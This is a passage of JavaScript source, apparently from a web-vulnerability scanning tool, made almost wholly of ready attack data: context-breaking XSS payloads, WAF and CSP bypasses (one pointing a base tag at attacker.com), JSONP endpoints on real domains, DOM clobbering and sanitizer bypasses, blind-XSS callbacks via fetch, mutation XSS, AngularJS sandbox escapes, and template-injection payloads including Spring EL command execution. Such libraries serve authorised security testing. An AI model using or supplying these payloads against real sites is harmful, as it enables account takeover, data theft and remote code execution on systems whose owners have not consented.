    ],
    'select-context': [
      { needs: ['<', '/'],
        payload: id => `</select><img src=1 onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close select + img onerror',
        realPayload: '</select><img src=1 onerror=alert(1)>', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</option></select><img src=1 onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close option + select + img onerror',
        realPayload: '</option></select><img src=1 onerror=alert(1)>', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</select><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close select + svg onload',
        realPayload: '</select><svg onload=alert(1)>', bypass: 'img filtered' },
      { needs: ['"', '<', '/'],
        payload: id => `"></select><img src=1 onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Break attr + close select + img onerror',
        realPayload: '"></select><img src=1 onerror=alert(1)>', bypass: null },
    ],
    'textarea-context': [
      { needs: ['<', '/'],
        payload: id => `</textarea><img src=1 onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close textarea + img onerror',
        realPayload: '</textarea><img src=1 onerror=alert(1)>', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</textarea><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close textarea + svg onload',
        realPayload: '</textarea><svg onload=alert(1)>', bypass: 'img filtered' },
    ],
    'title-context': [
      { needs: ['<', '/'],
        payload: id => `</title><img src=1 onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close title + img onerror',
        realPayload: '</title><img src=1 onerror=alert(1)>', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</title><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close title + svg onload',
        realPayload: '</title><svg onload=alert(1)>', bypass: 'img filtered' },
    ],
    'canonical-link': [
      { needs: ["'"],
        payload: id => `' accesskey='x' onclick='window.__xss_${id}=1' `,
        check: id => !!window[`__xss_${id}`],
        desc: 'Accesskey + onclick in canonical link (ALT+SHIFT+X)',
        realPayload: "' accesskey='x' onclick='alert(1)' ", bypass: null },
    ],
    'iframe-srcdoc': [
      { needs: ['"', '<'],
        payload: id => `"><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close srcdoc + inject tag',
        realPayload: '"><img src=x onerror=alert(1)>', bypass: null },
      { needs: ['<'],
        payload: id => `<img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Direct tag injection in srcdoc', bypass: null },
    ],
    'noscript-context': [
      { needs: ['<', '/'],
        payload: id => `</noscript><img src=x onerror="window.__xss_${id}=1">`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close noscript + img onerror',
        realPayload: '</noscript><img src=x onerror=alert(1)>', bypass: null },
      { needs: ['<', '/'],
        payload: id => `</noscript><svg onload=window.__xss_${id}=1>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Close noscript + svg onload',
        realPayload: '</noscript><svg onload=alert(1)>', bypass: 'img filtered' },
    ],
    'meta-refresh': [
      { needs: [':'],
        payload: id => `0;url=javascript:window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Meta refresh with javascript: URL',
        realPayload: '0;url=javascript:alert(1)', bypass: null },
    ],
    'js-code': [
      { needs: ['(', ')'],
        payload: id => `window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Direct assignment in JS code',
        realPayload: 'alert(1)', bypass: null },
      { needs: ['(', ')'],
        payload: id => `-window.__xss_${id}=1-0`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Expression context assignment',
        realPayload: '-alert(1)-', bypass: null },
      { needs: [],
        payload: id => `window['__xss_'+String.fromCharCode(${id.split('').map(c => c.charCodeAt(0)).join(',')})]=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Bracket notation assignment (no parens)',
        realPayload: 'alert`1`', bypass: 'parentheses filtered' },
      { needs: [';'],
        payload: id => `;window.__xss_${id}=1//`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Statement break + assignment',
        realPayload: ';alert(1)//', bypass: null },
      { needs: ['<'],
        payload: id => `</script><script>window.__xss_${id}=1</script>`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Script breakout via new script tag', bypass: null },
    ],
    'js-url': [
      { needs: [],
        payload: id => `alert(1)`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Direct call in javascript: URL', bypass: null },
      { needs: [],
        payload: id => `window.__xss_${id}=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Assignment in javascript: URL', bypass: null },
      { needs: [],
        payload: id => `throw/**/onerror=s=>{window.__xss_${id}=1},1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'throw + onerror (no parentheses)', bypass: 'parentheses blocked' },
      { needs: [],
        payload: id => `},x=x=>{throw/**/onerror=s=>{window.__xss_${id}=1},1},toString=x,window+'',{x:'`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Arrow fn + toString override (spaces blocked)', bypass: 'spaces blocked' },
      { needs: [],
        payload: id => `void(onerror=s=>{window.__xss_${id}=1}),throw/**/1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'void + throw combo', bypass: 'spaces blocked' },
      { needs: [],
        payload: id => `self?.["__xss_"+String?.fromCharCode?.(${id.split('').map(c => c.charCodeAt(0)).join(',')})]=1`,
        check: id => !!window[`__xss_${id}`],
        desc: 'Optional chaining assignment (WAF bypass — ?. evades filters)',
        realPayload: 'alert?.(1)', bypass: 'alert keyword blocked' },
    ],
  };

  // =====================================================
  // WAF BYPASS TAG/EVENT COMBOS — for brute-force enumeration
  // =====================================================
  ns.WAF_BYPASS_COMBOS = [
    // Standard auto-fire
    { tag: 'img', attrs: 'src=x', event: 'onerror' },
    { tag: 'svg', attrs: '', event: 'onload' },
    { tag: 'body', attrs: '', event: 'onload' },
    { tag: 'input', attrs: 'autofocus', event: 'onfocus' },
    { tag: 'details', attrs: 'open', event: 'ontoggle' },
    { tag: 'video', attrs: '', event: 'onloadstart', inner: '<source src=x>' },
    { tag: 'audio', attrs: 'src=x', event: 'onloadstart' },
    { tag: 'marquee', attrs: '', event: 'onstart' },
    { tag: 'iframe', attrs: 'src=about:blank', event: 'onload' },
    { tag: 'object', attrs: 'data=x', event: 'onerror' },
    { tag: 'embed', attrs: 'src=x type=text/html', event: 'onerror' },
    // SVG animation (common WAF bypass)
    { tag: 'svg', attrs: '', event: '', inner: '<animate onbegin=PAYLOAD attributeName=x dur=1s>' },
    { tag: 'svg', attrs: '', event: '', inner: '<animatetransform onbegin=PAYLOAD attributeName=transform type=rotate dur=1s>' },
    { tag: 'svg', attrs: '', event: '', inner: '<set onbegin=PAYLOAD attributeName=x to=1 dur=1s>' },
    // Custom elements
    { tag: 'xss', attrs: 'tabindex=1 id=x', event: 'onfocus', needsHash: true },
    { tag: 'x', attrs: 'tabindex=1 id=x', event: 'onfocus', needsHash: true },
    // Animation events
    { tag: 'div', attrs: 'style="animation-name:x"', event: 'onanimationstart', needsStyle: '@keyframes x{}' },
    { tag: 'div', attrs: 'style="width:1px;transition:width 0.1s" onload=""', event: 'ontransitionend' },
    // Less common
    { tag: 'select', attrs: 'autofocus', event: 'onfocus' },
    { tag: 'textarea', attrs: 'autofocus', event: 'onfocus' },
    { tag: 'button', attrs: 'autofocus', event: 'onfocus' },
    { tag: 'a', attrs: 'href="" autofocus', event: 'onfocus' },
    // Print events (Chrome XSS PoC)
    { tag: 'body', attrs: '', event: 'onbeforeprint' },
    // Pointer events
    { tag: 'div', attrs: 'style="width:100px;height:100px"', event: 'onpointerover' },
    // Media events
    { tag: 'video', attrs: 'src=x', event: 'onerror' },
    { tag: 'source', attrs: 'src=x', event: 'onerror', parentTag: 'video' },
    { tag: 'track', attrs: 'src=x default', event: 'onerror', parentTag: 'video' },
    // Link
    { tag: 'link', attrs: 'href=x rel=stylesheet', event: 'onerror' },
    // SVG animate href (event handlers + href blocked bypass)
    { tag: 'svg', attrs: '', event: '', inner: '<a><animate attributeName=href values=javascript:PAYLOAD /><text x=20 y=20>Click</text></a>', needsInteraction: true },
    // SVG nested events
    { tag: 'svg', attrs: '', event: '', inner: '<svg onload=PAYLOAD>' },
    // Math namespace confusion
    { tag: 'math', attrs: '', event: '', inner: '<mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=PAYLOAD>">' },
    // Form + button interaction
    { tag: 'form', attrs: 'action=javascript:PAYLOAD', event: '', inner: '<button>Click</button>' },
    // Meta refresh
    { tag: 'meta', attrs: 'http-equiv=refresh content="0;url=javascript:PAYLOAD"', event: '' },
    // SVG foreignObject
    { tag: 'svg', attrs: '', event: '', inner: '<foreignObject><body onload=PAYLOAD xmlns="http://www.w3.org/1999/xhtml"></body></foreignObject>' },
    // Math + img
    { tag: 'math', attrs: '', event: '', inner: '<mtext><img src=x onerror=PAYLOAD>' },
    // Style + img (WAF bypass for img onerror)
    { tag: 'style', attrs: '', event: '', inner: '</style><img src=x onerror=PAYLOAD>' },
    // DL/DD with autofocus (rare but works)
    { tag: 'dl', attrs: '', event: '', inner: '<dt tabindex=1 onfocus=PAYLOAD id=x>' },
  ];

  // =====================================================
  // JAVASCRIPT PROTOCOL ENCODING VARIANTS
  // =====================================================
  ns.JS_PROTOCOL_VARIANTS = [
    'javascript:',
    'Javascript:',
    'JAVASCRIPT:',
    'JaVaScRiPt:',
    'java\tscript:',
    'java\nscript:',
    'java\rscript:',
    'j\u0061v\u0061script:',
    '&#106;avascript:',
    '&#74;avascript:',
    '&#x6A;avascript:',
    'java&#9;script:',
    'java&#10;script:',
    'java&#13;script:',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;',
  ];

  // =====================================================
  // CSP BYPASS STRATEGIES
  // =====================================================
  ns.CSP_BYPASSES = [
    { condition: 'unsafe-inline', desc: 'CSP allows inline scripts — standard XSS works' },
    { condition: 'unsafe-eval', desc: 'CSP allows eval — use eval() or new Function()' },
    { condition: 'cdnjs.cloudflare.com', desc: 'CDNJS allowed — load Angular then inject expression',
      payload: '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app>{{$on.constructor("alert(1)")()}}</div>' },
    { condition: 'cdn.jsdelivr.net', desc: 'jsDelivr CDN — load Angular then inject',
      payload: '<script src="https://cdn.jsdelivr.net/npm/angular@1.6.13/angular.min.js"></script><div ng-app>{{constructor.constructor("alert(1)")()}}</div>' },
    { condition: 'unpkg.com', desc: 'unpkg CDN — load Angular then inject',
      payload: '<script src="https://unpkg.com/angular@1.6.13/angular.min.js"></script><div ng-app>{{constructor.constructor("alert(1)")()}}</div>' },
    { condition: 'ajax.googleapis.com', desc: 'Google Ajax CDN — load Angular',
      payload: '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.13/angular.min.js"></script><div ng-app>{{constructor.constructor("alert(1)")()}}</div>' },
    { condition: '*.googleapis.com', desc: 'Google APIs allowed — try Angular via Ajax CDN',
      payload: '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.13/angular.min.js"></script><div ng-app>{{constructor.constructor("alert(1)")()}}</div>' },
    { condition: 'nonce-', desc: 'CSP uses nonce — look for nonce leaks or base tag injection' },
    { condition: 'strict-dynamic', desc: 'strict-dynamic — if you can inject into an existing script, new scripts are trusted' },
    { condition: "'self'", desc: "self directive — file upload or path traversal to load attacker script" },
    { condition: '__missing_base-uri__', desc: 'No base-uri directive — base tag injection can redirect relative script URLs',
      payload: '<base href="https://attacker.com/">' },
    { condition: 'data:', desc: 'data: URIs allowed in script-src',
      payload: '<script src="data:text/javascript,alert(1)"></script>' },
    { condition: 'blob:', desc: 'blob: URIs allowed in script-src — create blob from inline JS' },
    { condition: 'https:', desc: 'scheme-only allowlist — any HTTPS domain can serve scripts' },
    { condition: 'http:', desc: 'scheme-only allowlist — any HTTP domain can serve scripts (insecure!)' },
    { condition: 'report-uri', desc: 'report-uri with token param — inject script-src-elem \'unsafe-inline\' via token to override CSP',
      payload: '&token=;script-src-elem \'unsafe-inline\'' },
    { condition: '__missing_form-action__', desc: 'No form-action directive — dangling markup via formaction attribute can exfil data' },
  ];

  // Known domains with JSONP endpoints exploitable for CSP bypass
  ns.JSONP_ENDPOINTS = [
    { domain: 'accounts.google.com', url: 'https://accounts.google.com/o/oauth2/revoke?callback=CALLBACK', desc: 'Google OAuth revoke JSONP' },
    { domain: 'www.google.com', url: 'https://www.google.com/complete/search?client=chrome&q=xss&callback=CALLBACK', desc: 'Google Autocomplete JSONP' },
    { domain: '*.google.com', url: 'https://accounts.google.com/o/oauth2/revoke?callback=CALLBACK', desc: 'Google wildcard JSONP' },
    { domain: '*.googleapis.com', url: 'https://maps.googleapis.com/maps/api/js?callback=CALLBACK', desc: 'Google Maps API JSONP' },
    { domain: 'cdnjs.cloudflare.com', url: 'https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.min.js', desc: 'CDNJS — load AngularJS for CSTI instead' },
    { domain: 'cdn.jsdelivr.net', url: 'https://cdn.jsdelivr.net/npm/angular@1.6.13/angular.min.js', desc: 'jsDelivr — load AngularJS for CSTI instead' },
    { domain: 'www.googleapis.com', url: 'https://www.googleapis.com/customsearch/v1?callback=CALLBACK', desc: 'Google Custom Search JSONP' },
    { domain: 'ajax.googleapis.com', url: 'https://ajax.googleapis.com/ajax/services/search/web?v=1.0&callback=CALLBACK', desc: 'Google Ajax Search JSONP' },
    { domain: '*.gstatic.com', url: 'https://www.gstatic.com', desc: 'Google Static — check for JSONP endpoints' },
    { domain: '*.facebook.com', url: 'https://www.facebook.com/plugins/like.php?callback=CALLBACK', desc: 'Facebook JSONP' },
    { domain: '*.twitter.com', url: 'https://syndication.twitter.com/timeline?callback=CALLBACK', desc: 'Twitter syndication JSONP' },
    { domain: '*.youtube.com', url: 'https://www.youtube.com/oembed?url=http://youtube.com/watch?v=dQw4w9WgXcQ&format=json&callback=CALLBACK', desc: 'YouTube oEmbed JSONP' },
  ];

  // =====================================================
  // DOM CLOBBERING PATTERNS
  // =====================================================
  ns.DOM_CLOBBERING = [
    { target: 'x.y', payload: '<a id=x><a id=x name=y href="PAYLOAD">', desc: 'Clobber x.y via dual anchor' },
    { target: 'x', payload: '<img name=x src=PAYLOAD>', desc: 'Clobber global x via img name' },
    { target: 'x', payload: '<form id=x><input name=y value=PAYLOAD>', desc: 'Clobber x.y via form/input' },
    { target: 'x', payload: '<output id=x>PAYLOAD</output>', desc: 'Clobber x via output textContent' },
    { target: 'x.avatar', payload: '<a id=x><a id=x name=avatar href="cid:&quot;onerror=alert(1)//">', desc: 'DOMPurify bypass via cid: protocol (quotes not URL-encoded)' },
    { target: 'x.attributes', payload: '<form id=x tabindex=0 onfocus=alert(1)><input id=attributes>', desc: 'HTMLJanitor bypass: clobber .attributes property' },
  ];

  // =====================================================
  // BLIND XSS PAYLOADS — out-of-band callback templates
  // =====================================================
  ns.BLIND_XSS_PAYLOADS = [
    url => `<script src="${url}"></script>`,
    url => `<img src=x onerror="fetch('${url}')">`,
    url => `<svg onload="fetch('${url}')">`,
    url => `<input onfocus="fetch('${url}')" autofocus>`,
    url => `"><img src=x onerror="fetch('${url}')">`,
    url => `<details open ontoggle="fetch('${url}')">x</details>`,
  ];

  // =====================================================
  // MUTATION XSS (mXSS) PAYLOADS — browser HTML mutation vectors
  // =====================================================
  ns.MXSS_PAYLOADS = [
    {
      input: '<table><img src=x onerror=alert(1)>',
      desc: 'Table foster parenting — img ejected outside table',
      check: html => /<img[^>]*onerror/i.test(html) && !/<table[^>]*>.*<img/is.test(html),
    },
    {
      input: '<svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>',
      desc: 'SVG foreignObject namespace confusion',
      check: html => /onerror/i.test(html),
    },
    {
      input: '<math><mtext><table><mglyph><svg><mtext><style><img src onerror=alert(1)>',
      desc: 'Math/SVG namespace confusion (DOMPurify bypass pattern)',
      check: html => /onerror/i.test(html),
    },
    {
      input: '<svg><style><img src=x onerror=alert(1)></style></svg>',
      desc: 'SVG style breakout via title attr',
      check: html => /onerror/i.test(html) && /<img/i.test(html),
    },
    {
      input: '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path><animate attributeName=href values=javascript:alert(1)>',
      desc: 'Double form + math/svg namespace',
      check: html => /javascript:/i.test(html),
    },
    {
      input: '<noscript><style></noscript><img src=x onerror=alert(1)>',
      desc: 'noscript + style context confusion',
      check: html => /onerror/i.test(html) && /<img/i.test(html),
    },
    // Mutation-based (re-serialization) payloads
    {
      input: '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
      desc: 'SVG + style re-serialization (Cure53 mXSS variant)',
      check: html => /onerror/i.test(html),
    },
    {
      input: '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">',
      desc: 'Math/SVG triple namespace with style breakout',
      check: html => /onerror/i.test(html),
    },
    {
      input: '<svg><textarea><img src=x onerror=alert(1)>',
      desc: 'SVG textarea foreign content confusion',
      check: html => /onerror/i.test(html),
    },
  ];

  // =====================================================
  // PROTOTYPE POLLUTION — sources, sinks, and XSS gadgets
  // =====================================================
  ns.PROTO_POLLUTION_SOURCES = [
    { pattern: /__proto__/gi, desc: '__proto__ property access' },
    { pattern: /constructor\s*\[\s*['"]prototype['"]\s*\]/gi, desc: 'constructor["prototype"] access' },
    { pattern: /constructor\s*\.\s*prototype/gi, desc: 'constructor.prototype access' },
    { pattern: /Object\s*\.\s*create\s*\(\s*null\s*\)/gi, desc: 'Object.create(null) — safe prototype, but check merge logic' },
  ];

  ns.PROTO_POLLUTION_SINKS = [
    { pattern: /Object\s*\.\s*assign\s*\(/gi, desc: 'Object.assign — recursive merge' },
    { pattern: /\$\s*\.\s*extend\s*\(\s*true/gi, desc: '$.extend(true,...) — deep merge' },
    { pattern: /_\s*\.\s*merge\s*\(/gi, desc: '_.merge — lodash deep merge' },
    { pattern: /_\s*\.\s*defaultsDeep\s*\(/gi, desc: '_.defaultsDeep — lodash deep defaults' },
    { pattern: /JSON\s*\.\s*parse\s*\(\s*location/gi, desc: 'JSON.parse(location...) — URL-based pollution' },
  ];

  ns.PROTO_POLLUTION_GADGETS = [
    'innerHTML', 'outerHTML', 'src', 'href', 'srcdoc',
    'onload', 'onerror', 'onclick', 'onfocus',
    'template', 'callback', 'url', 'action',
  ];

  // =====================================================
  // POSTMESSAGE VULNERABILITY PATTERNS — origin bypass + sink flows
  // =====================================================
  ns.POSTMESSAGE_VULN_PATTERNS = {
    flawedOriginChecks: [
      { pattern: /\.indexOf\s*\(\s*['"]https?:/gi, desc: 'indexOf origin check — bypassable via javascript:...//http:' },
      { pattern: /\.search\s*\(\s*['"]https?:/gi, desc: 'search() origin check — bypassable via substring match' },
      { pattern: /\.includes\s*\(\s*['"]https?:/gi, desc: 'includes() origin check — bypassable via comment trick' },
      { pattern: /\.match\s*\(\s*['"]https?:/gi, desc: 'match() origin check — bypassable with crafted strings' },
      { pattern: /\.startsWith\s*\(\s*['"]https?:/gi, desc: 'startsWith origin check — proper if checking event.origin' },
    ],
    dangerousSinks: [
      { pattern: /\.innerHTML\s*=\s*(?:e(?:vent|vt)?\.data|msg|message|data)/gi, desc: 'postMessage → innerHTML (direct XSS)' },
      { pattern: /location\s*(?:\.\s*href\s*=|=)\s*(?:e(?:vent|vt)?\.data|msg|message|data)/gi, desc: 'postMessage → location.href (javascript: URL)' },
      { pattern: /\.src\s*=\s*(?:e(?:vent|vt)?\.data|msg|message|data)/gi, desc: 'postMessage → iframe/img src' },
      { pattern: /eval\s*\(\s*(?:e(?:vent|vt)?\.data|msg|message|data)/gi, desc: 'postMessage → eval (code execution)' },
      { pattern: /document\s*\.\s*write\s*\(\s*(?:e(?:vent|vt)?\.data|msg|message|data)/gi, desc: 'postMessage → document.write' },
    ],
  };

  // =====================================================
  // ANGULARJS SANDBOX ESCAPES — version-specific
  // =====================================================
  ns.ANGULAR_SANDBOX_ESCAPES = [
    { maxVer: '1.0.7', payload: "{{constructor.constructor('alert(1)')()}}", desc: 'Direct constructor chain (pre-sandbox)' },
    { maxVer: '1.1.5', payload: "{{constructor.constructor('alert(1)')()}}", desc: 'Constructor chain' },
    { maxVer: '1.2.18', payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", desc: 'charAt override' },
    { maxVer: '1.2.23', payload: "{{'a'[{toString:toString,join:'a]'['constructor']['prototype']['join']=['a'].join('|')|orderBy:toString}]}}", desc: 'orderBy filter bypass' },
    { maxVer: '1.2.31', payload: "{{x={y:''.constructor.prototype};x.y.charAt=[].join;$eval('x=alert(1)');}}", desc: 'Prototype write bypass' },
    { maxVer: '1.3.20', payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}", desc: 'Sandbox escape v1.3' },
    { maxVer: '1.4.9', payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", desc: 'Sandbox escape v1.4' },
    { maxVer: '1.5.8', payload: "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}", desc: 'Sandbox escape v1.5' },
    { maxVer: '1.5.11', payload: "{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(\"ast498tele498teleport=teleport\");A=B(a]a]'alert(1)')()}}", desc: 'Complex sandbox escape v1.5' },
    { maxVer: '1.6.x', payload: "{{$on.constructor('alert(1)')()}}", desc: '$on constructor (v1.6+, sandbox removed)' },
    { maxVer: '99.0', payload: "{{constructor.constructor('alert(1)')()}}", desc: 'Constructor chain (no sandbox)' },
    { maxVer: '99.0', payload: "1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1", desc: 'Sandbox escape without strings (fromCharCode + charAt override)', urlSuffix: true },
    { maxVer: '99.0', payload: "{{[].pop.constructor('alert(1)')()}}", desc: 'Array proto constructor (no sandbox)' },
    { maxVer: '1.5.11', payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", desc: 'Universal charAt override (works up to 1.5.x)' },
  ];

  // =====================================================
  // SSTI / TEMPLATE INJECTION — canary payloads & fingerprinting
  // =====================================================
  ns.SSTI_PAYLOADS = [
    { expr: '{{7*7}}', result: '49', engines: ['Jinja2', 'Twig', 'AngularJS', 'Nunjucks', 'Pebble'] },
    { expr: '${7*7}', result: '49', engines: ['Freemarker', 'Mako', 'EL', 'JS Template Literal'] },
    { expr: '<%= 7*7 %>', result: '49', engines: ['ERB', 'EJS', 'JSP'] },
    { expr: '#{7*7}', result: '49', engines: ['Thymeleaf', 'Pug/Jade', 'Ruby'] },
    { expr: '${{7*7}}', result: '49', engines: ['Jinja2 (alt)', 'Twig (alt)'] },
    { expr: '{7*7}', result: '49', engines: ['Smarty', 'Velocity'] },
    { expr: "{{7*'7'}}", result: '7777777', engines: ['Jinja2 (string multiplication — confirms Jinja2 vs Twig)'] },
    { expr: "{{7*'7'}}", result: '49', engines: ['Twig (numeric coercion — confirms Twig vs Jinja2)'] },
  ];

  ns.SSTI_DEBUG_PAYLOADS = [
    { expr: '{% debug %}', engines: ['Django'], desc: 'Django debug output' },
    { expr: '{{settings.SECRET_KEY}}', engines: ['Django'], desc: 'Django secret key leak' },
    { expr: '{{config}}', engines: ['Flask/Jinja2'], desc: 'Flask config dump' },
    { expr: '{{self}}', engines: ['Mako', 'Jinja2'], desc: 'Template self reference' },
    { expr: '{{dump(app)}}', engines: ['Symfony/Twig'], desc: 'Symfony app dump' },
    { expr: '${T(java.lang.Runtime).getRuntime().exec("id")}', engines: ['Spring EL'], desc: 'Spring EL RCE' },
    { expr: "{{''.__class__.__mro__[1].__subclasses__()}}", engines: ['Jinja2'], desc: 'Jinja2 class hierarchy for RCE' },
  ];

  // Template engine fingerprinting map: which result confirms which engine
  ns.SSTI_FINGERPRINT = {
    '49_{{7*7}}': ['Jinja2', 'Twig', 'Nunjucks'],
    '49_${7*7}': ['Freemarker', 'Mako', 'EL'],
    '49_<%= 7*7 %>': ['ERB', 'EJS', 'JSP'],
    '49_#{7*7}': ['Thymeleaf', 'Pug/Jade'],
    '49_${{7*7}}': ['Jinja2', 'Twig'],
    '49_{7*7}': ['Smarty', 'Velocity'],
    '7777777_{{7*\'7\'}}': ['Jinja2'],
    '49_{{7*\'7\'}}': ['Twig'],
  };

  // Client-side template engines to detect in addition to AngularJS
  ns.CSTI_ENGINES = [
    { name: 'Handlebars', detect: () => !!window.Handlebars, exprPattern: /\{\{[^}]+\}\}/g },
    { name: 'Mustache', detect: () => !!window.Mustache, exprPattern: /\{\{[^}]+\}\}/g },
    { name: 'Pug', detect: () => !!window.pug || !!window.jade, exprPattern: /!?\{[^}]+\}/g },
    { name: 'EJS', detect: () => !!window.ejs, exprPattern: /<%[=-]?\s*[^%]+\s*%>/g },
    { name: 'Nunjucks', detect: () => !!window.nunjucks, exprPattern: /\{\{[^}]+\}\}|\{%[^%]+%\}/g },
    { name: 'doT', detect: () => !!window.doT, exprPattern: /\{\{=[^}]+\}\}/g },
    { name: 'Underscore/Lodash templates', detect: () => (window._ && typeof window._.template === 'function'), exprPattern: /<%[=-]?\s*[^%]+\s*%>/g },
  ];

})();
